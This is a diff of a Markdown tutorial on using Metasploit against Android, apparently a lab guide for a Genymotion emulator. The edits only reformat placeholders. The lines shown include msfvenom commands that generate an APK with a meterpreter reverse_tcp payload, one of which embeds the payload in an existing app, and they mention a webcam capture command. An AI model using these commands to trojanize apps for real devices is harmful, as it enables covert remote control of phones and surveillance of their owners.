@@ -22,7 +22,7 @@ Connect to the remote target device(genymotion/android) using adb
 ### 1) Steps to generate an apk with the reverse_tcp payload
 Go to ‘opt/metasploit-framework/bin’ and enter the following command to generate an apk
 
-$ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>
+$ ./msfvenom -p android/meterpreter/reverse_tcp LHOST=[localhost ip] LPORT=4444 -o [destination path/test.apk]
 
 ![](https://github.com/v1ns3c/Write-ups/blob/efa9b7c48ef35f5b35c27813c16c9c08a0e2a4ed/Images/Documentations/Metasploit_for_Android/1.jpg)
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/2.png)
@@ -109,7 +109,7 @@ $ webcam_snap 1 ‘or’ 2
 
 Go to ‘opt/metasploit-framework/bin’ and enter the following command
 
-$ ./msfvenom -x <apk path/apkname.apk> -p android/meterpreter/reverse_tcp LHOST=<localhost ip> LPORT=4444 -o <destination path/test.apk>
+$ ./msfvenom -x [apk path/apkname.apk] -p android/meterpreter/reverse_tcp LHOST=[localhost ip] LPORT=4444 -o [destination path/test.apk]
 
 ![](https://github.com/v1ns3c/Write-ups/blob/d9db4bfdb9bbf321d1540ab40cb9e9b2685542d5/Images/Documentations/Metasploit_for_Android/22.jpg)
 
@@ -117,9 +117,9 @@ Install the app in the device and repeat the msfconsole steps as shown earlier t
 
 ## Extra Commands for metasploit
 
-$ show exploits- (Get all exploits till date)
+$ show exploits (Get all exploits till date)
 
-$ search <any random keyword>
+$ search [any random keyword]
 
 (ex- search android- to get all exploits related to android)
 
